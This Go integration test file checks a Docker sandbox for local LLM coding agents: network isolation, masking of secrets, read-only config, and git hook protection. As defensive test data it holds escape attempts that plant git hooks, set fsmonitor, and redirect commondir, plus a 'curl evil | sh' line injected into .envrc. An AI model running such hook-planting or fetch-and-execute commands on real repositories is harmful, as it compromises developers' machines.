//go:build integration

// Integration tests run the probe suite in a real sandbox against a stub
// gateway on host loopback. Run with: go test -tags integration ./...
package check

import (
	"errors"
	"io/fs"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"

	"localllm/assets"
	"localllm/internal/docker"
	"localllm/internal/mask"
	"localllm/internal/probe"
	"localllm/internal/sandbox"
)

const (
	testAgentImage     = "localllm-base:latest"
	testForwarderImage = "localllm-forwarder:latest"
)

func requireDocker(t *testing.T) {
	t.Helper()
	if err := exec.Command("docker", "info").Run(); err != nil {
		t.Skip("docker not available")
	}
	for name, tag := range map[string]string{"forwarder": testForwarderImage, "base": testAgentImage} {
		if exec.Command("docker", "image", "inspect", tag).Run() == nil {
			continue
		}
		ctx, err := fs.Sub(assets.Images, "images/"+name)
		if err != nil {
			t.Fatal(err)
		}
		if err := docker.BuildImage(tag, ctx); err != nil {
			t.Fatalf("build %s: %v", tag, err)
		}
	}
}

// stubGateway serves /v1/models on host loopback and returns its gateway.
func stubGateway(t *testing.T) sandbox.Gateway {
	t.Helper()
	return stubGatewayWithKey(t, "")
}

// stubGatewayWithKey is stubGateway requiring "Authorization: Bearer key",
// as llama-swap does with apiKeys, unless key is empty.
func stubGatewayWithKey(t *testing.T, key string) sandbox.Gateway {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	srv := &http.Server{Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/v1/models" {
			http.NotFound(w, r)
			return
		}
		if key != "" && r.Header.Get("Authorization") != "Bearer "+key {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"data":[{"id":"stub-model"}]}`))
	})}
	go srv.Serve(ln)
	t.Cleanup(func() { srv.Close() })
	return sandbox.Gateway{Host: "host.docker.internal", Port: ln.Addr().(*net.TCPAddr).Port}
}

// projectDir creates a project under the user cache dir, which Docker
// Desktop-style VMs share by default (unlike macOS's per-user temp dir).
func projectDir(t *testing.T) string {
	t.Helper()
	cache, err := os.UserCacheDir()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(cache, 0o700); err != nil {
		t.Fatal(err)
	}
	dir, err := os.MkdirTemp(cache, "localllm-test-")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.RemoveAll(dir) })
	return dir
}

func startSandbox(t *testing.T, mutate func(*sandbox.Compose)) (*docker.Session, sandbox.Gateway) {
	t.Helper()
	return startInputs(t, sandbox.Inputs{ProjectDir: projectDir(t)}, mutate)
}

// startInputs fills in the common inputs and starts a sandbox.
func startInputs(t *testing.T, in sandbox.Inputs, mutate func(*sandbox.Compose)) (*docker.Session, sandbox.Gateway) {
	t.Helper()
	return startKeyed(t, in, mutate, stubGateway(t), "")
}

// startKeyed starts a sandbox against gw, passing key to the session.
func startKeyed(t *testing.T, in sandbox.Inputs, mutate func(*sandbox.Compose), gw sandbox.Gateway, key string) (*docker.Session, sandbox.Gateway) {
	t.Helper()
	in.UID, in.GID = os.Getuid(), os.Getgid()
	in.Gateway = gw
	in.AgentImage, in.ForwarderImage = testAgentImage, testForwarderImage
	spec := sandbox.Build(in)
	if mutate != nil {
		mutate(&spec)
	}
	s, err := docker.Start(spec, t.TempDir(), key)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(s.Close)
	return s, gw
}

func TestContainedSandboxPassesAllProbes(t *testing.T) {
	requireDocker(t)
	s, gw := startSandbox(t, nil)

	results, err := Run(s, gw, Mounts{})
	if err != nil {
		t.Fatal(err)
	}
	for _, r := range results {
		if !r.Passed() {
			t.Errorf("probe %q failed: exit %d (missing=%v, mustSucceed=%v)", r.Name, r.ExitCode, r.Missing, r.MustSucceed)
		}
	}
	// The gateway port must be probed directly on some host address, proving
	// the agent can't bypass the forwarder to reach the gateway.
	if !probesPort(results, gw.Port) {
		t.Errorf("no direct host probe of gateway port %d", gw.Port)
	}
}

func TestBrokenSandboxIsDetected(t *testing.T) {
	requireDocker(t)
	// Put the agent on the normal network too, as a misconfiguration would.
	s, gw := startSandbox(t, func(spec *sandbox.Compose) {
		agent := spec.Services[sandbox.AgentService]
		for name, n := range spec.Networks {
			if !n.Internal {
				agent.Networks[name] = &sandbox.NetworkAttach{}
			}
		}
		spec.Services[sandbox.AgentService] = agent
	})

	results, err := Run(s, gw, Mounts{})
	if err != nil {
		t.Fatal(err)
	}
	failed := probe.Failed(results)
	if len(failed) == 0 {
		t.Fatal("no probe failed although the agent has a route out")
	}
	for _, r := range failed {
		if r.Name == "dns host.docker.internal" {
			return
		}
	}
	t.Errorf("expected the host.docker.internal probe among failures, got %v", names(failed))
}

func probesPort(results []probe.Result, port int) bool {
	suffix := ":" + strconv.Itoa(port)
	for _, r := range results {
		if strings.HasPrefix(r.Name, "host ") && strings.HasSuffix(r.Name, suffix) {
			return true
		}
	}
	return false
}

func names(results []probe.Result) []string {
	var n []string
	for _, r := range results {
		n = append(n, r.Name)
	}
	return n
}

func TestReadOnlyMountRejectsWrites(t *testing.T) {
	requireDocker(t)
	target := sandbox.ReadOnlyRoot + "/ref"
	for _, readOnly := range []bool{true, false} {
		ref := projectDir(t)
		s, gw := startSandbox(t, func(spec *sandbox.Compose) {
			agent := spec.Services[sandbox.AgentService]
			agent.Volumes = append(agent.Volumes, sandbox.Volume{Type: "bind", Source: ref, Target: target, ReadOnly: readOnly})
			spec.Services[sandbox.AgentService] = agent
		})

		results, err := Run(s, gw, Mounts{ReadOnly: []string{target}})
		if err != nil {
			t.Fatal(err)
		}
		var found bool
		for _, r := range results {
			if r.Name != "read-only "+target {
				continue
			}
			found = true
			if r.Passed() != readOnly {
				t.Errorf("read_only=%v: probe passed = %v (exit %d)", readOnly, r.Passed(), r.ExitCode)
			}
		}
		if !found {
			t.Errorf("no read-only probe in %v", names(results))
		}
	}
}

// gitEnv mirrors the CLI's git settings with a fixed identity.
var gitEnv = map[string]string{
	"GIT_CONFIG_COUNT":   "3",
	"GIT_CONFIG_KEY_0":   "safe.directory",
	"GIT_CONFIG_VALUE_0": "*",
	"GIT_CONFIG_KEY_1":   "user.name",
	"GIT_CONFIG_VALUE_1": "agent",
	"GIT_CONFIG_KEY_2":   "user.email",
	"GIT_CONFIG_VALUE_2": "agent@example.com",
}

// gitRepo creates a project that is a git repository with one commit.
func gitRepo(t *testing.T) string {
	t.Helper()
	dir := projectDir(t)
	for _, args := range [][]string{
		{"init", "-q"},
		{"-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "--allow-empty", "-m", "init"},
	} {
		if out, err := exec.Command("git", append([]string{"-C", dir}, args...)...).CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
	}
	return dir
}

// startProtected starts a sandbox for project with its mask layout applied.
func startProtected(t *testing.T, project string) (*docker.Session, sandbox.Gateway, Mounts) {
	t.Helper()
	layout, err := mask.Plan(project, mask.DefaultRules)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { layout.Cleanup(project) })
	if err := layout.Prepare(project); err != nil {
		t.Fatal(err)
	}
	pinned, readOnly, err := layout.Bind(project, t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	var m Mounts
	m.Pinned, m.ReadOnly, m.Masked = layout.Targets()
	s, gw := startInputs(t, sandbox.Inputs{ProjectDir: project, Pinned: pinned, ReadOnly: readOnly, Env: gitEnv}, nil)
	return s, gw, m
}

func requirePass(t *testing.T, results []probe.Result) {
	t.Helper()
	for _, r := range probe.Failed(results) {
		t.Errorf("probe %q failed: exit %d (missing=%v)", r.Name, r.ExitCode, r.Missing)
	}
}

func TestGitProtection(t *testing.T) {
	requireDocker(t)
	project := gitRepo(t)
	// A husky-style hooks dir and a linked worktree, whose parents the agent
	// must not be able to rename away.
	if err := os.MkdirAll(filepath.Join(project, ".husky/_"), 0o755); err != nil {
		t.Fatal(err)
	}
	// A committed config the repo includes, and a conditional include
	// whose target is missing.
	if err := os.WriteFile(filepath.Join(project, ".gitconfig"), []byte("[core]\n\tautocrlf = false\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, args := range [][]string{
		{"config", "core.hooksPath", ".husky/_"},
		{"config", "include.path", "../.gitconfig"},
		{"config", "includeIf.onbranch:release.path", "../ci/git.cfg"},
		{"worktree", "add", "-q", filepath.Join(t.TempDir(), "wt")},
	} {
		if out, err := exec.Command("git", append([]string{"-C", project}, args...)...).CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
	}
	s, gw, mounts := startProtected(t, project)

	results, err := Run(s, gw, mounts)
	if err != nil {
		t.Fatal(err)
	}
	requirePass(t, results)
	for _, want := range []string{"read-only /workspace/.git/hooks", "read-only /workspace/.git/config", "read-only /workspace/.envrc", "pinned /workspace/.git", "read-only /workspace/.gitconfig", "read-only /workspace/ci"} {
		if !slices.ContainsFunc(results, func(r probe.Result) bool { return r.Name == want }) {
			t.Errorf("no probe %q", want)
		}
	}

	// Each attempt prints its name when it succeeds; none may.
	escapes, err := s.Capture("sh", "-c", `
try() { name=$1; shift; "$@" >/dev/null 2>&1 && echo "ESCAPED $name"; }
try hook-create touch .git/hooks/pre-commit
try hook-edit sh -c 'echo x >> .git/hooks/pre-commit.sample'
try config-file sh -c 'echo x >> .git/config'
try hooksPath git config core.hooksPath x
try fsmonitor git config core.fsmonitor x
try envrc-edit sh -c 'echo x > .envrc'
try envrc-remove rm -f .envrc
try git-rename mv .git .git-old
try commondir sh -c 'echo ../evil > .git/commondir'
try commondir-remove rm -f .git/commondir
try husky-rename mv .husky .husky-old
try husky-hook touch .husky/_/pre-commit
try worktree-rename mv .git/worktrees/wt .git/worktrees/x
try worktree-commondir sh -c 'echo ../../../evil > .git/worktrees/wt/commondir'
try include-edit sh -c 'printf "[core]\n\tfsmonitor = ./x\n" >> .gitconfig'
try include-rename mv .gitconfig .gitconfig-old
try include-create sh -c 'echo x > ci/git.cfg'
try include-dir-rename mv ci ci-old
echo DONE`)
	if err != nil {
		t.Fatal(err)
	}
	if escapes = strings.TrimSpace(escapes); escapes != "DONE" {
		t.Errorf("protections bypassed:\n%s", escapes)
	}

	out, err := s.Capture("sh", "-c", `set -e
echo hi > a.txt
git add a.txt
git commit -q -m add
git checkout -q -b feature
echo more >> a.txt
git diff --stat
echo GIT-OK`)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "GIT-OK") || !strings.Contains(out, "a.txt") {
		t.Fatalf("git inside the sandbox failed:\n%s", out)
	}
	if b, _ := exec.Command("git", "-C", project, "branch", "--show-current").Output(); strings.TrimSpace(string(b)) != "feature" {
		t.Errorf("host branch = %q, want feature", b)
	}
	if hooks, _ := filepath.Glob(filepath.Join(project, ".git/hooks/pre-commit")); len(hooks) > 0 {
		t.Errorf("hook planted on host: %v", hooks)
	}
}

func TestEnvrcContentUnchanged(t *testing.T) {
	requireDocker(t)
	project := gitRepo(t)
	envrc := filepath.Join(project, ".envrc")
	if err := os.WriteFile(envrc, []byte("use flake\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	s, _, _ := startProtected(t, project)
	s.Capture("sh", "-c", "echo 'curl evil | sh' > .envrc; echo x >> .envrc")
	if b, _ := os.ReadFile(envrc); string(b) != "use flake\n" {
		t.Errorf(".envrc = %q", b)
	}
}

func TestPlaceholdersRemoved(t *testing.T) {
	requireDocker(t)
	project := gitRepo(t)
	layout, err := mask.Plan(project, mask.DefaultRules)
	if err != nil {
		t.Fatal(err)
	}
	s, _, _ := startProtected(t, project)
	s.Capture("true")
	s.Close()
	layout.Cleanup(project)
	for _, rel := range []string{".envrc", ".git/commondir", mask.IgnoreFile} {
		if _, err := os.Lstat(filepath.Join(project, rel)); !os.IsNotExist(err) {
			t.Errorf("%s left on the host: %v", rel, err)
		}
	}
}

func TestNonGitProjectStarts(t *testing.T) {
	requireDocker(t)
	s, gw, mounts := startProtected(t, projectDir(t))
	results, err := Run(s, gw, mounts)
	if err != nil {
		t.Fatal(err)
	}
	requirePass(t, results)
}

func TestMissingProtectionIsDetected(t *testing.T) {
	requireDocker(t)
	// Probe for the protections without applying them.
	project := gitRepo(t)
	s, gw := startInputs(t, sandbox.Inputs{ProjectDir: project}, nil)
	results, err := Run(s, gw, Mounts{
		ReadOnly: []string{"/workspace/.git/hooks", "/workspace/.git/config"},
		Pinned:   []string{"/workspace/.git"},
	})
	if err != nil {
		t.Fatal(err)
	}
	failed := names(probe.Failed(results))
	for _, want := range []string{"read-only /workspace/.git/hooks", "read-only /workspace/.git/config", "pinned /workspace/.git"} {
		if !slices.Contains(failed, want) {
			t.Errorf("probe %q passed without the protection (failed: %v)", want, failed)
		}
	}
}

func TestSecretsMasked(t *testing.T) {
	requireDocker(t)
	project := gitRepo(t)
	files := map[string]string{
		".env":                    "API_KEY=secret\n",
		"deploy/.aws/credentials": "aws_secret_access_key=secret\n",
		"private/notes.txt":       "secret\n",
		".localllmignore":         "private/\n",
		"main.go":                 "package main\n",
	}
	for rel, content := range files {
		path := filepath.Join(project, rel)
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	s, gw, mounts := startProtected(t, project)

	results, err := Run(s, gw, mounts)
	if err != nil {
		t.Fatal(err)
	}
	requirePass(t, results)
	for _, want := range []string{"masked /workspace/.env", "masked /workspace/deploy/.aws", "masked /workspace/private"} {
		if !slices.ContainsFunc(results, func(r probe.Result) bool { return r.Name == want }) {
			t.Errorf("no probe %q", want)
		}
	}

	out, err := s.Capture("sh", "-c", `
echo "env=[$(cat .env)] aws=[$(ls -A deploy/.aws)] private=[$(ls -A private)] main=[$(cat main.go)]"
try() { name=$1; shift; "$@" >/dev/null 2>&1 && echo "ESCAPED $name"; }
try env-write sh -c 'echo x > .env'
try env-remove rm -f .env
try aws-write touch deploy/.aws/new
try ignore-edit sh -c 'echo "!.env" >> .localllmignore'
echo DONE`)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "env=[] aws=[] private=[] main=[package main]") || strings.Contains(out, "ESCAPED") || !strings.Contains(out, "DONE") {
		t.Errorf("inside the sandbox:\n%s", out)
	}
	for rel, content := range files {
		if b, _ := os.ReadFile(filepath.Join(project, rel)); string(b) != content {
			t.Errorf("host %s = %q, want %q", rel, b, content)
		}
	}
}

func TestMissingMaskIsDetected(t *testing.T) {
	requireDocker(t)
	project := gitRepo(t)
	if err := os.WriteFile(filepath.Join(project, ".env"), []byte("API_KEY=secret\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	s, gw := startInputs(t, sandbox.Inputs{ProjectDir: project}, nil)
	results, err := Run(s, gw, Mounts{Masked: []string{"/workspace/.env"}})
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Contains(names(probe.Failed(results)), "masked /workspace/.env") {
		t.Error("masked probe passed although .env is readable")
	}
}

// startWithState starts a sandbox for project with its opencode state volume
// and a read-only agent config, as run does.
func startWithState(t *testing.T, project string) (*docker.Session, sandbox.Gateway, Mounts) {
	t.Helper()
	cfg := filepath.Join(t.TempDir(), "opencode.json")
	if err := os.WriteFile(cfg, []byte("{}"), 0o644); err != nil {
		t.Fatal(err)
	}
	const cfgTarget = "/etc/localllm/opencode.json"
	vol := sandbox.StateVolume(project, "opencode")
	s, gw := startInputs(t, sandbox.Inputs{
		ProjectDir:  project,
		ReadOnly:    []sandbox.Mount{{Source: cfg, Target: cfgTarget}},
		StateVolume: vol,
	}, nil)
	return s, gw, Mounts{ReadOnly: []string{cfgTarget}, State: sandbox.StateDir}
}

// removeVolume deletes a state volume after the test, once its sessions are
// closed (cleanups run last-in, first-out).
func removeVolume(t *testing.T, project string) {
	t.Helper()
	vol := sandbox.StateVolume(project, "opencode")
	t.Cleanup(func() { exec.Command("docker", "volume", "rm", "-f", vol).Run() })
}

func TestStateVolumePerProject(t *testing.T) {
	requireDocker(t)
	a, b := projectDir(t), projectDir(t)
	removeVolume(t, a)
	removeVolume(t, b)
	marker := `"$XDG_DATA_HOME/opencode/marker"`

	// First session of A: probes pass and a file lands in its data dir.
	s, gw, m := startWithState(t, a)
	results, err := Run(s, gw, m)
	if err != nil {
		t.Fatal(err)
	}
	requirePass(t, results)
	for _, name := range []string{"state writable", "read-only /etc/localllm/opencode.json"} {
		if !slices.Contains(names(results), name) {
			t.Errorf("no probe %q", name)
		}
	}
	if out, _ := s.Capture("sh", "-c", `mkdir -p "$XDG_DATA_HOME/opencode" && echo session-a > `+marker+` && cat `+marker); strings.TrimSpace(out) != "session-a" {
		t.Fatalf("write marker: %q", out)
	}
	s.Close()

	// A later session of A sees it; B doesn't.
	s, _, _ = startWithState(t, a)
	if out, _ := s.Capture("sh", "-c", "cat "+marker); strings.TrimSpace(out) != "session-a" {
		t.Errorf("project A's later session reads %q, want session-a", out)
	}
	s.Close()
	s, _, _ = startWithState(t, b)
	if out, _ := s.Capture("sh", "-c", "cat "+marker+" 2>/dev/null; echo end"); strings.TrimSpace(out) != "end" {
		t.Errorf("project B sees project A's state: %q", out)
	}
}

// TestScratchDirWithReadOnlyConfig mounts config files inside a scratch
// tmpfs, as for pi: the files reject writes and can't be moved away, the
// directory around them is writable, and nothing written there survives
// the container.
func TestScratchDirWithReadOnlyConfig(t *testing.T) {
	requireDocker(t)
	dir := t.TempDir()
	const agentDir = sandbox.Home + "/.pi/agent"
	var ro []sandbox.Mount
	var targets []string
	for _, name := range []string{"settings.json", "models.json"} {
		src := filepath.Join(dir, name)
		if err := os.WriteFile(src, []byte("{}"), 0o644); err != nil {
			t.Fatal(err)
		}
		ro = append(ro, sandbox.Mount{Source: src, Target: agentDir + "/" + name})
		targets = append(targets, agentDir+"/"+name)
	}
	s, gw := startInputs(t, sandbox.Inputs{ProjectDir: projectDir(t), ReadOnly: ro, Scratch: []string{agentDir}}, nil)

	results, err := Run(s, gw, Mounts{ReadOnly: targets})
	if err != nil {
		t.Fatal(err)
	}
	requirePass(t, results)

	script := `d=` + agentDir + `
mkdir "$d/settings.json.lock" && rmdir "$d/settings.json.lock" && echo lock-ok
mv "$d/settings.json" "$d/moved" 2>/dev/null || echo move-refused
echo trusted > "$d/trust.json" && echo scratch-written`
	out, _ := s.Capture("sh", "-c", script)
	for _, want := range []string{"lock-ok", "move-refused", "scratch-written"} {
		if !strings.Contains(out, want) {
			t.Errorf("output %q lacks %q", out, want)
		}
	}
	if out, _ := s.Capture("sh", "-c", "cat "+agentDir+"/trust.json 2>/dev/null; echo end"); strings.TrimSpace(out) != "end" {
		t.Errorf("scratch dir kept a file from an earlier container: %q", out)
	}
}

func TestGatewayGetThroughForwarder(t *testing.T) {
	requireDocker(t)
	s, _ := startSandbox(t, nil)
	data, err := s.GatewayGet("/v1/models")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(data), `"stub-model"`) {
		t.Errorf("/v1/models = %s", data)
	}
	if _, err := s.GatewayGet("/missing"); err == nil {
		t.Error("no error for a 404")
	}
}

// TestGatewayKey runs against a gateway that requires a key: with the key
// configured the model list and the gateway probe work; without it, or
// with a wrong one, both fail and the fetch reports ErrUnauthorized.
func TestGatewayKey(t *testing.T) {
	requireDocker(t)
	const key = "sk-integration-secret"
	gw := stubGatewayWithKey(t, key)
	cases := []struct {
		name string
		// configured is the key the session has; ok is whether the gateway
		// accepts it.
		configured string
		ok         bool
	}{
		{"configured", key, true},
		{"missing", "", false},
		{"wrong", "sk-wrong", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			in := sandbox.Inputs{ProjectDir: projectDir(t), GatewayKey: c.configured != ""}
			s, _ := startKeyed(t, in, nil, gw, c.configured)

			_, err := s.GatewayGet("/v1/models")
			if c.ok && err != nil {
				t.Errorf("GatewayGet: %v", err)
			}
			if !c.ok && !errors.Is(err, docker.ErrUnauthorized) {
				t.Errorf("GatewayGet err = %v, want ErrUnauthorized", err)
			}
			if err != nil && strings.Contains(err.Error(), key) {
				t.Errorf("error contains the key: %v", err)
			}

			results, err := Run(s, gw, Mounts{})
			if err != nil {
				t.Fatal(err)
			}
			for _, r := range results {
				if r.Name == "gateway /v1/models" && r.Passed() != c.ok {
					t.Errorf("gateway probe passed = %v, want %v", r.Passed(), c.ok)
				}
			}
			if c.ok {
				requirePass(t, results)
			}
		})
	}
}
